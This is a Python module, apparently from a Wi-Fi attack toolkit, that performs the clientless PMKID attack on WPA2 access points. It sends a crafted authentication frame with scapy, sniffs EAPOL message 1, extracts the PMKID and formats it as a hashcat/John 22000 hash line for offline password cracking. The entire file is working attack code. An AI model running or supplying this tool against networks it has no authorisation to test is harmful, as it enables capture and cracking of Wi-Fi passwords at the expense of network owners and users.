"""Clientless PMKID attack: authenticate to the AP and capture EAPOL message 1."""

from __future__ import annotations

from scapy.sendrecv import sendp, sniff

from ..frames import craft_auth, is_eapol
from ..radio import set_channel

RSN_PMKID_SUITE = 16  # element ID inside the RSN KDE carrying the PMKID


def extract_pmkid(eapol_raw: bytes) -> bytes | None:
    """Pull the 16-byte PMKID from the RSN KDE of an EAPOL M1 frame, or None."""
    # WPA key data layout: ...key_data_len(2) at offset 95..97 of the key frame,
    # but in practice scan for the KDE: dd ?? 00 0f ac 04 <pmkid16>
    marker = b"\xdd"
    idx = 0
    while True:
        idx = eapol_raw.find(marker, idx)
        if idx < 0 or idx + 2 >= len(eapol_raw):
            return None
        length = eapol_raw[idx + 1]
        kde = eapol_raw[idx + 2 : idx + 2 + length]
        if len(kde) >= 20 and kde[:4] == b"\x00\x0f\xac\x04":
            return kde[4:20]
        idx += 2


def to_22000(pmkid: bytes, bssid: str, client: str, essid: str | None = None) -> str:
    """Format a PMKID as a hashcat/John 22000 line: PMKID*AP*CLIENT[*ESSID]."""
    mac_ap = bssid.replace(":", "")
    mac_cl = client.replace(":", "")
    line = f"{pmkid.hex()}*{mac_ap}*{mac_cl}"
    if essid:
        line += f"*{essid.encode().hex()}"
    return line


def capture_pmkid(
    iface: str,
    bssid: str,
    client: str,
    channel: int | None = None,
    timeout: float = 10.0,
) -> str | None:
    """Send an auth frame and sniff EAPOL M1; return a 22000 line or None."""
    if channel is not None:
        set_channel(iface, channel)
    sendp(craft_auth(bssid=bssid, client=client), iface=iface, verbose=False)
    found: list[str] = []

    def handler(pkt) -> None:
        if not is_eapol(pkt):
            return
        from ..frames import eapol_key_info

        info = eapol_key_info(pkt)
        if info is None or info[0]:  # want M1: mic not set
            return
        pmkid = extract_pmkid(bytes(pkt))
        if pmkid:
            found.append(to_22000(pmkid, bssid, client))

    sniff(iface=iface, timeout=timeout, prn=handler, store=False)
    return found[0] if found else None
